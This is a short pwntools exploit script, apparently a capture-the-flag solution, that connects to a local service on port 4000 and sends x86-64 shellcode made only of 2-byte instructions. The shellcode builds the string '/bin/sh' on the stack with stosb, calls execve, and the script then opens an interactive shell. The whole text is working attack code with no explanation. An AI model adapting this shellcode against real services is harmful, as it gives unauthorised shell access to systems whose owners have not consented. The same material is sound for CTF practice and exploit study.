from pwn import *

context.arch = 'amd64'

io = remote('localhost', 4000)

# 2 byte instructions
shellcode = asm("""
    push rsp
    pop rbx      
    push rsp
    pop rdi     

    mov al, 47 
    stosb    
    mov al, 98 
    stosb
    mov al, 105 
    stosb
    mov al, 110 
    stosb    
    mov al, 47
    stosb     
    mov al, 115
    stosb
    mov al, 104 
    stosb
    xor al, al
    stosb

    push rbx 
    pop rdi
    xor esi, esi          
    xor edx, edx          

    push 59                
    pop rax                 

    syscall                   
""")

io.recvuntil(b"assembly?")

io.send(shellcode)

io.interactive()
